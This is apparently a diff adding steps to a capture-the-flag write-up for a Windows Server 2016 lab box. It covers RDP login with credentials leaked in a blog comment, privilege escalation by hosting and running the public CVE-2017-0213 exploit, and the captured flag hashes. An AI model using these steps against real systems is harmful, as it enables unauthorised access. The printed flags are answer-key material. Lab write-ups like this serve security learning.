@@ -95,6 +95,8 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 4.64 seconds
 ```
 
+The product [version](https://betawiki.net/wiki/Windows_Server_2016_build_14393_(rs1_release)) is the most useful thing here and can help us to find a CVE that we will use later.
+
 ## 2. Find the Hidden Directory with the Website
 
 Visiting MACHINE_IP in the browser returns a Microsoft Windows Server landing page.
@@ -247,16 +249,44 @@ Interesting Finding(s):
 
 ## 4. Try a Remote Desktop Connection
 
-https://www.kali.org/tools/freerdp3/#xfreerdp3
-
 Wade left a single comment on one of the blog posts that happened to be his password. >_>
 
 ```bash
 $ xfreerdp3 /u:wade /p:parzival /v:10.201.95.130
 ```
 
-## 3. user.txt
+## 5. user.txt
 
 It's right on the desktop.
 > 3b99fbdc6d430bfb51c72c651a261927
 
+## 6. Elevate Privileges
+
+We can cross reference this repository of [windows kernel exploits](https://github.com/SecWiki/windows-kernel-exploits) with this [database](https://www.cvedetails.com/product/34965/Microsoft-Windows-Server-2016.html?vendor_id=26) to find an exploit working on Windows Server 2016. We can use [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213).
+
+```bash
+└─$ mv ~/Downloads/CVE-2017-0213_x64.zip /tmp 
+└─$ cd /tmp && unzip /tmp/CVE-2017-0213_x64.zip 
+Archive:  /tmp/CVE-2017-0213_x64.zip
+  inflating: CVE-2017-0213_x64.exe   
+└─$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Navigate to the server on the remote desktop, download, and run the executable.
+
+## 7. root.txt
+
+```bash
+dir /s c:\*root.txt*
+```
+```bash
+type c:\Users\Administrator\Desktop\root.txt.txt
+```
+> 7958b569565d7bd88d10c6f22d1c4063
+
+## Sources
+- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html
+- https://www.kali.org/tools/freerdp3/#xfreerdp3
+- https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
+- https://www.cvedetails.com/cve/CVE-2017-0213/
